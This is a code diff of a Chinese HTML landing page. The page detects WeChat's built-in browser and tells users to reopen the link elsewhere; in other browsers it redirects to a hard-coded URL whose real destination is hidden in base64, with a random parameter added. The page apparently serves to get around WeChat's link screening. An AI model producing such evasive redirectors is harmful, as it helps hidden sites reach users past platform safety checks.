@@ -2,11 +2,6 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <!-- 缓存控制 -->
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>微信浏览器引导跳转</title>
     <style>
@@ -49,33 +44,6 @@
             margin: 15px 0;
             color: #333;
             font-size: 16px;
-            padding: 0;
-            background: transparent;
-        }
-        
-        /* 错误提示样式 */
-        .error-message {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 80%;
-        }
-        
-        .retry-button {
-            margin-top: 15px;
-            padding: 8px 15px;
-            background: #07C160;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
         }
     </style>
 </head>
@@ -85,14 +53,6 @@
         <img src="/guide-top.png" alt="第一步：点击右上角三个点" class="guide-image top">
         <p class="guide-text">请点击右上角 <span style="font-size: 1.2em;">···</span> 选择"在浏览器中打开"</p>
         <img src="/guide-bottom.png" alt="第二步：选择在浏览器中打开" class="guide-image bottom">
-    </div>
-    
-    <!-- 错误提示 -->
-    <div id="errorMessage" class="error-message">
-        <h3>网络连接异常</h3>
-        <p>抱歉，页面加载遇到问题，可能是网络连接不稳定。</p>
-        <button id="retryButton" class="retry-button">重试</button>
-        <p style="margin-top: 10px;font-size: 12px;color: #999;">错误代码: <span id="errorCode"></span></p>
     </div>
     
     <script>
@@ -106,21 +66,6 @@
             return Math.floor(Math.random() * 900 + 100); // 100-999之间的随机数
         }
         
-        // 显示错误信息
-        function showError(error) {
-            console.error('页面加载错误:', error);
-            document.getElementById('errorCode').textContent = error.message || error;
-            document.getElementById('errorMessage').style.display = 'block';
-            document.getElementById('weixinGuide').style.display = 'none';
-        }
-        
-        // 获取当前URL带随机参数
-        function getCurrentUrlWithRandom() {
-            const baseUrl = window.location.href.split('?')[0].split('#')[0];
-            const randomParam = "wxrnd=" + generateRandomNumber();
-            return baseUrl + (baseUrl.includes('?') ? '&' : '?') + randomParam;
-        }
-        
         // 获取目标URL带随机参数
         function getTargetUrl() {
             const baseUrl = "http://laicai.66ghz.com/c.htm?c=aHR0cDovL3h6enouaHVpc2hpLm5hbWUvc2FmZS9pbmRleD9pZD0xNjE="; // 请替换为实际地址
@@ -128,65 +73,22 @@
             return baseUrl + (baseUrl.includes('?') ? '&' : '?') + randomParam;
         }
         
-        // 安全跳转函数
-        function safeRedirect(url) {
-            try {
-                // 优先使用iframe方式跳转（兼容微信）
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = url;
-                document.body.appendChild(iframe);
-                
-                // 备用方案
-                setTimeout(() => {
-                    window.location.href = url;
-                }, 300);
-            } catch (error) {
-                showError(error);
-            }
+        // 处理外部浏览器跳转
+        function handleExternalBrowserRedirect() {
+            // 直接跳转到目标页（已带随机参数）
+            window.location.href = getTargetUrl();
         }
         
-        // 处理微信内跳转逻辑
-        function handleWeixinFlow() {
-            const currentUrl = window.location.href;
-            
-            if (!currentUrl.includes('wxrnd=')) {
-                safeRedirect(getCurrentUrlWithRandom());
+        // 页面加载逻辑
+        window.onload = function() {
+            if (isWeixinBrowser()) {
+                // 微信内直接显示引导页
+                document.getElementById('weixinGuide').style.display = 'flex';
             } else {
-                try {
-                    document.getElementById('weixinGuide').style.display = 'flex';
-                    // 已移除所有弹窗提醒代码
-                } catch (error) {
-                    showError(error);
-                }
+                // 外部浏览器跳转
+                handleExternalBrowserRedirect();
             }
-        }
-        
-        // 初始化函数
-        function init() {
-            try {
-                document.getElementById('retryButton').addEventListener('click', () => {
-                    document.getElementById('errorMessage').style.display = 'none';
-                    if (isWeixinBrowser()) {
-                        handleWeixinFlow();
-                    } else {
-                        safeRedirect(getTargetUrl());
-                    }
-                });
-                
-                if (isWeixinBrowser()) {
-                    handleWeixinFlow();
-                } else {
-                    safeRedirect(getTargetUrl());
-                }
-            } catch (error) {
-                showError(error);
-            }
-        }
-        
-        // 页面加载后初始化
-        window.addEventListener('load', init);
-        window.addEventListener('DOMContentLoaded', init);
+        };
     </script>
 </body>
 </html>
